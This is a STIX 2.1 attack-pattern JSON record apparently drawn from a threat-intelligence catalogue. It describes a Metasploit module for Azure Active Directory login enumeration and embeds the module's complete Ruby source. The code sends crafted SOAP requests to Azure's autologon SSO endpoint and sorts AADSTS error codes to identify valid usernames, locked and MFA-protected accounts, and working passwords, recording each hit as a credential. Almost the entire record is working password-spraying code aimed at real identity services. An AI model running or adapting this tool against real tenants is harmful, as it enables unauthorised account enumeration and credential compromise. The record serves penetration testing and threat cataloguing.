{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7461f125-9d50-4adb-b3f9-8a62432e8053",
    "created": "2024-08-14T16:29:30.306425Z",
    "modified": "2024-08-14T16:29:30.30643Z",
    "name": "Microsoft Azure Active Directory Login Enumeration",
    "description": " This module enumerates valid usernames and passwords against a Microsoft Azure Active Directory domain by utilizing a flaw in how SSO authenticates. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/azure_ad_login.rb",
            "external_id": "azure_ad_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://raxis.com/blog/metasploit-azure-ad-login"
        },
        {
            "source_name": "reference",
            "url": "https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/treebuilder/aad-sso-enum-brute-spray"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name' => 'Microsoft Azure Active Directory Login Enumeration',\n      'Description' => %q{\n        This module enumerates valid usernames and passwords against a\n        Microsoft Azure Active Directory domain by utilizing a flaw in\n        how SSO authenticates.\n      },\n      'Author' => [\n        'Matthew Dunn - k0pak4'\n      ],\n      'License' => MSF_LICENSE,\n      'References' => [\n        [ 'URL', 'https://raxis.com/blog/metasploit-azure-ad-login'],\n        [ 'URL', 'https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/'],\n        [ 'URL', 'https://github.com/treebuilder/aad-sso-enum-brute-spray'],\n      ],\n      'DefaultOptions' => {\n        'RPORT' => 443,\n        'SSL' => true,\n        'RHOST' => 'autologon.microsoftazuread-sso.com',\n        'PASSWORD' => 'password'\n      }\n    )\n\n    register_options(\n      [\n        OptString.new('RHOST', [true, 'The target Azure endpoint', 'autologon.microsoftazuread-sso.com']),\n        OptString.new('DOMAIN', [true, 'The target Azure AD domain']),\n        OptString.new('TARGETURI', [ true, 'The base path to the Azure autologon endpoint', '/winauth/trust/2005/usernamemixed']),\n      ]\n    )\n\n    deregister_options('PASSWORD_SPRAY', 'VHOST', 'USER_AS_PASS',\n                       'USERPASS_FILE', 'STOP_ON_SUCCESS', 'Proxies',\n                       'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS',\n                       'BLANK_PASSWORDS', 'RHOSTS')\n  end\n\n  def report_login(address, domain, username, password)\n    # report information, if needed\n    service_data = service_details.merge({\n      address: address,\n      service_name: 'Azure AD',\n      workspace_id: myworkspace_id\n    })\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n      realm_value: domain,\n      username: username,\n      private_data: password,\n      private_type: :password\n    }.merge(service_data)\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def check_login(targeturi, domain, username, password)\n    request_id = SecureRandom.uuid\n    url = \"https://#{rhost}/#{domain}#{targeturi}\"\n\n    created = Time.new.inspect\n    expires = (Time.new + 600).inspect\n\n    message_id = SecureRandom.uuid\n    username_token = SecureRandom.uuid\n\n    body = \"<?xml version='1.0' encoding='UTF-8'?>\n<s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>\n    <s:Header>\n        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>\n        <wsa:To s:mustUnderstand='1'>#{url}</wsa:To>\n        <wsa:MessageID>urn:uuid:#{message_id}</wsa:MessageID>\n        <wsse:Security s:mustUnderstand=\\\"1\\\">\n            <wsu:Timestamp wsu:Id=\\\"_0\\\">\n                <wsu:Created>#{created}</wsu:Created>\n                <wsu:Expires>#{expires}</wsu:Expires>\n            </wsu:Timestamp>\n            <wsse:UsernameToken wsu:Id=\\\"#{username_token}\\\">\n                <wsse:Username>#{username.strip.encode(xml: :text)}@#{domain}</wsse:Username>\n                <wsse:Password>#{password.strip.encode(xml: :text)}</wsse:Password>\n            </wsse:UsernameToken>\n        </wsse:Security>\n    </s:Header>\n    <s:Body>\n        <wst:RequestSecurityToken Id='RST0'>\n            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>\n                <wsp:AppliesTo>\n                    <wsa:EndpointReference>\n                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>\n                    </wsa:EndpointReference>\n                </wsp:AppliesTo>\n                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>\n        </wst:RequestSecurityToken>\n    </s:Body>\n</s:Envelope>\"\n\n    res = send_request_raw({\n      'uri' => \"/#{domain}#{targeturi}\",\n      'method' => 'POST',\n      'vars_get' => {\n        'client-request-id' => request_id\n      },\n      'data' => body\n    })\n\n    unless res\n      fail_with(Failure::Unreachable, \"#{peer} - Could not communicate with service.\")\n    end\n\n    @target_host ||= report_host(host: rhost, name: rhost, state: Msf::HostState::Alive)\n\n    # Check the XML response for either the SSO Token or the error code\n    xml = res.get_xml_document\n    xml.remove_namespaces!\n\n    if xml.xpath('//DesktopSsoToken')[0]\n      auth_details = xml.xpath('//DesktopSsoToken')[0].text\n    else\n      auth_details = xml.xpath('//internalerror/text')[0].text\n    end\n\n    if xml.xpath('//DesktopSsoToken')[0]\n      print_good(\"Login #{domain}\\\\#{username}:#{password} is valid!\")\n      print_good(\"Desktop SSO Token: #{auth_details}\")\n      report_login(@target_host.address, domain, username, password)\n      :next_user\n    elsif auth_details.start_with?('AADSTS50126') # Valid user but incorrect password\n      print_good(\"Password #{password} is invalid but #{domain}\\\\#{username} is valid!\")\n      report_login(@target_host.address, domain, username, nil)\n    elsif auth_details.start_with?('AADSTS50056') # User exists without a password in Azure AD\n      print_good(\"#{domain}\\\\#{username} is valid but the user does not have a password in Azure AD!\")\n      report_login(@target_host.address, domain, username, nil)\n      :next_user\n    elsif auth_details.start_with?('AADSTS50076') # User exists, but you need MFA to connect to this resource\n      print_good(\"Login #{domain}\\\\#{username}:#{password} is valid, but you need MFA to connect to this resource\")\n      report_login(@target_host.address, domain, username, password)\n      :next_user\n    elsif auth_details.start_with?('AADSTS50014') # User exists, but the maximum Pass-through Authentication time was exceeded\n      print_good(\"#{domain}\\\\#{username} is valid but the maximum pass-through authentication time was exceeded\")\n      report_login(@target_host.address, domain, username, nil)\n    elsif auth_details.start_with?('AADSTS50034') # User does not exist\n      print_error(\"#{domain}\\\\#{username} is not a valid user\")\n    elsif auth_details.start_with?('AADSTS50053') # Account is locked\n      print_error(\"#{domain}\\\\#{username} is locked, consider taking time before continuing to scan!\")\n      :next_user\n    elsif auth_details.start_with?('AADSTS50057') # User exists, but is disabled so we don't report\n      print_error(\"#{domain}\\\\#{username} exists but is disabled; it will not be reported\")\n      :next_user\n    else # Unknown error code\n      print_error(\"Received unknown response with error code: #{auth_details}\")\n    end\n  end\n\n  def run\n    each_user_pass do |cur_user, cur_pass|\n      check_login(datastore['TARGETURI'], datastore['DOMAIN'], cur_user, cur_pass)\n    end\n  end\nend\n"
}